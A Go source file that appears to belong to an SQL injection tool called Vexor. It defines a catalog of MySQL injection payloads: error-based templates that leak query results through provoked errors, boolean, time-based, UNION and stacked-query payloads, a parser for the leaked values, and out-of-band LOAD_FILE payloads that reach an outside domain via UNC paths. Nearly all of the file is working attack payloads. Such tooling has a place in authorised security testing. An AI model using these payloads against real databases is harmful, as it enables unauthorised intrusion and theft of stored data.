package dbms

import (
	"strings"
)

// ---------------------------------------------------------------------------
// Structured MySQL error-based payload catalog
// ---------------------------------------------------------------------------

// ErrorPayload describes one distinct MySQL error-based injection technique
// with the metadata needed to describe it to an operator. The Template carries
// a {query} placeholder that is replaced at runtime with the actual extraction
// query; payloads that delimit the leaked value also use {mark1}/{mark2} for
// the surrounding hex markers.
type ErrorPayload struct {
	// Title is the human-readable description of the payload, e.g.
	// "MySQL >= 5.1 AND error-based - EXTRACTVALUE".
	Title string
	// Template is the payload skeleton with {query} (and optionally
	// {mark1}/{mark2}) placeholders, already wrapped in the injection context
	// (AND/OR/parameter-replace/table-name clause).
	Template string
	// ConfidenceBoost is added to the base detection confidence when this
	// payload confirms, so more specific/explicit techniques score higher.
	ConfidenceBoost int
	// MinMySQLVersion is the minimum MySQL release this technique targets
	// (e.g. "5.0", "5.1"), reported to the operator.
	MinMySQLVersion string
}

// MySQLErrorPayloads returns the known MySQL error-based detection payloads in
// the order they should be tried. Every payload's {query} placeholder is
// replaced at runtime with the extraction query (e.g. "(SELECT VERSION())"),
// and the 0x7e-marker payloads let Vexor parse the leaked value between the
// surrounding tildes.
func MySQLErrorPayloads() []ErrorPayload {
	return []ErrorPayload{
		{
			Title:           "MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)",
			Template:        `AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x{mark1},(SELECT ({query})),0x{mark2},0x61)s), 8446744073709551610, 8446744073709551610)))`,
			ConfidenceBoost: 10,
			MinMySQLVersion: "5.0",
		},
		{
			Title:           "MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)",
			Template:        `OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x{mark1},(SELECT ({query})),0x{mark2},0x61)s), 8446744073709551610, 8446744073709551610)))`,
			ConfidenceBoost: 10,
			MinMySQLVersion: "5.0",
		},
		{
			Title:           "MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)",
			Template:        `AND EXTRACTVALUE(8144,CONCAT(0x7e,(SELECT ({query})),0x7e))`,
			ConfidenceBoost: 20,
			MinMySQLVersion: "5.1",
		},
		{
			Title:           "MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)",
			Template:        `OR EXTRACTVALUE(8144,CONCAT(0x7e,(SELECT ({query})),0x7e))`,
			ConfidenceBoost: 20,
			MinMySQLVersion: "5.1",
		},
		{
			Title:           "MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)",
			Template:        `AND UPDATEXML(1774,CONCAT(0x7e,(SELECT ({query})),0x7e),6391)`,
			ConfidenceBoost: 20,
			MinMySQLVersion: "5.1",
		},
		{
			Title:           "MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)",
			Template:        `OR UPDATEXML(1774,CONCAT(0x7e,(SELECT ({query})),0x7e),6391)`,
			ConfidenceBoost: 20,
			MinMySQLVersion: "5.1",
		},
		{
			Title:           "MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)",
			Template:        `(UPDATEXML(7562,CONCAT(0x7e,(SELECT ({query})),0x7e),7807))`,
			ConfidenceBoost: 20,
			MinMySQLVersion: "5.1",
		},
		{
			Title:           "MySQL >= 5.0 error-based - Table name clause (FLOOR)",
			Template:        `(SELECT 3337 FROM(SELECT COUNT(*),CONCAT(0x{mark1},(SELECT ({query})),0x{mark2},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)`,
			ConfidenceBoost: 10,
			MinMySQLVersion: "5.0",
		},
	}
}

// RenderErrorPayload fills the {query} placeholder (and, when present, the
// {mark1}/{mark2} markers) in an error-based payload template. The returned
// string is the injection fragment that replaces the parameter value.
func RenderErrorPayload(tpl, query string, mark1, mark2 string) string {
	if mark1 == "" {
		mark1 = "7e"
	}
	if mark2 == "" {
		mark2 = "7e"
	}
	r := strings.NewReplacer(
		"{query}", query,
		"{mark1}", mark1,
		"{mark2}", mark2,
	)
	return r.Replace(tpl)
}

// ParseTilde extracts the value leaked between 0x7e (~) markers in a DBMS error
// response. It returns the content between the first "~" and the closing "~",
// or "" when no marker pair is present. Used by the error-based extraction and
// fingerprinting paths that read values out of provoked MySQL errors.
func ParseTilde(body []byte) string {
	s := string(body)
	i := strings.IndexByte(s, '~')
	if i < 0 {
		return ""
	}
	start := i + 1
	j := strings.IndexByte(s[start:], '~')
	if j < 0 {
		return ""
	}
	return s[start : start+j]
}

func init() {
	register(&Payloads{
		Name: MySQL,
		Boolean: []BoolPair{
			{True: "{orig} AND 1=1", False: "{orig} AND 1=2"},
			{True: "{orig} AND 1=1-- -", False: "{orig} AND 1=2-- -"},
			{True: "{orig}' AND '1'='1", False: "{orig}' AND '1'='2"},
			{True: "{orig}\" AND \"1\"=\"1", False: "{orig}\" AND \"1\"=\"2"},
			{True: "{orig}' AND 'a'='a'-- -", False: "{orig}' AND 'a'='b'-- -"},
			{True: "{orig}' AND ORD(MID(VERSION(),1,1))>51-- -", False: "{orig}' AND ORD(MID(VERSION(),1,1))<52-- -"},
			{True: "{orig}' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", False: "{orig}' AND (SELECT 1)=1-- -"},
		},
		Inline: []BoolPair{
			{True: "{orig} AND (SELECT 8634)=(SELECT 8634)", False: "{orig} AND (SELECT 8634)=(SELECT 8635)"},
			{True: "{orig}' AND (SELECT 8634)=(SELECT 8634)-- -", False: "{orig}' AND (SELECT 8634)=(SELECT 8635)-- -"},
			{True: "{orig} AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) IS NOT NULL", False: "{orig} AND (SELECT 1)=2"},
		},
		Time: []TimeTpl{
			{Payload: "{orig}' AND SLEEP({delay})-- -", Risk: 1},
			{Payload: "{orig} AND SLEEP({delay})-- -", Risk: 1},
			{Payload: "{orig}') AND SLEEP({delay})-- -", Risk: 2},
			{Payload: "{orig}' OR SLEEP({delay})-- -", Risk: 2},
			{Payload: "{orig} AND (SELECT * FROM (SELECT SLEEP({delay}))a)-- -", Risk: 2},
			{Payload: "{orig}' AND BENCHMARK(10000000,SHA1('test'))-- -", Risk: 3},
			{Payload: "{orig}' AND BENCHMARK(10000000,MD5(1))-- -", Risk: 3},
		},
		Error: []string{
			"{orig}' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT VERSION()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
			"{orig}' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE())))-- -",
			"{orig}' AND UPDATEXML(1,CONCAT(0x7e,(SELECT DATABASE())),1)-- -",
			"{orig}' AND GTID_SUBSET(CONCAT(0x7e,(SELECT VERSION())),1)-- -",
			"{orig}' AND (SELECT 1 FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x)-- -",
			"{orig}'",
			"{orig}' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -",
			"{orig}'",
		},
		Union: UnionTemplates{
			OrderBy: []string{
				"{orig} ORDER BY {n}-- -",
				"{orig}) ORDER BY {n}-- -",
			},
			UnionSelect: []string{
				"{orig} UNION ALL SELECT {cols}-- -",
				"{orig} UNION SELECT {cols}-- -",
				"{orig}) UNION ALL SELECT {cols}-- -",
			},
		},
		Stacked: []TimeTpl{
			{Payload: "{orig}';SELECT SLEEP({delay});-- -", Risk: 2},
			{Payload: "{orig};SELECT SLEEP({delay})-- -", Risk: 2},
		},
		OOB: []string{
			"{orig}' AND LOAD_FILE('\\\\\\\\{domain}\\\\a')-- -",
			"{orig}' AND LOAD_FILE(CONCAT(0x5c5c,'{domain}',0x5c,'{unc}'))-- -",
		},
		StackedOK: true,
	})
}
